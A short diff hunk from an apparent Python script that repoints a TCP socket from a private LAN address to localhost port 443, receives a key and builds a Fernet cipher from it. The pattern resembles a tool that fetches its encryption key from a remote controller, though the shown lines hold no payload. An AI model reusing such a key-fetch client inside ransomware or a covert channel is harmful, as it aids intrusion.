@@ -29,7 +29,7 @@ print("""
 """)
 conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
-conn.connect(('192.168.50.200',443))
+conn.connect(('127.0.0.1',443))
 
 key = conn.recv(1024)
 cipher = Fernet(key)
